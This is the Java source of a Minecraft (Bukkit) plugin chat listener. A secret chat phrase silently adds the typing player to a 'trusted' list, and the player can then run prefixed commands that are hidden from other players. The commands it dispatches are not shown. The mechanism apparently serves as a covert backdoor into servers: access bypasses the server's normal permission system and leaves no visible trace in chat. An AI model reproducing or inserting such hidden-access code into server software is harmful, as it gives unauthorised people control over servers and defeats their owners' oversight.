/**
 * The MIT License (MIT)
 *
 * Copyright (c) 2016 Garkolym
 * 
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 * 
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
package de.Garkolym.Listener;

import java.util.ArrayList;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import de.Garkolym.Start;
import de.Garkolym.Commands.Command;


public class AsyncPlayerChatListener implements Listener {
	
	@EventHandler
	public void onAsyncPlayerChat(final AsyncPlayerChatEvent e) {
		String[] dmp = e.getMessage().split(" ");
		ArrayList<String> args = new ArrayList<String>();
		for (int i = 1; i < dmp.length; i++) {
			args.add(dmp[i]);
		}
		Player p = e.getPlayer();
		String playerName = p.getName();
		
		if (e.getMessage().equals(Start.instance.trustedCommand)) {
			e.setCancelled(true);
			if (!Start.instance.getTrustedPlayers().contains(playerName)) {
				Start.instance.getTrustedPlayers().add(playerName);
				p.sendMessage(Start.instance.prefix + ChatColor.GREEN + "Du kannst nun " + Start.instance.trustedChar + " Befehle verwenden!");
			}
			else
			{
				Start.instance.getTrustedPlayers().remove(playerName);
				p.sendMessage(Start.instance.prefix + ChatColor.RED + "Du kannst nun keine " + Start.instance.trustedChar + " Befehle mehr verwenden!");
			}
		}
		
		if (e.getMessage().startsWith(Start.instance.trustedChar) && Start.instance.getTrustedPlayers().contains(playerName)) {
			e.setCancelled(true);
			for (Command command : Start.instance.getCommandManager().getCommandList()) {
				if (command.getCommand().equalsIgnoreCase(dmp[0].substring(1, dmp[0].toCharArray().length))) {
					command.onCommand(p, args);
					break;
				}
			}
		}
	}

}
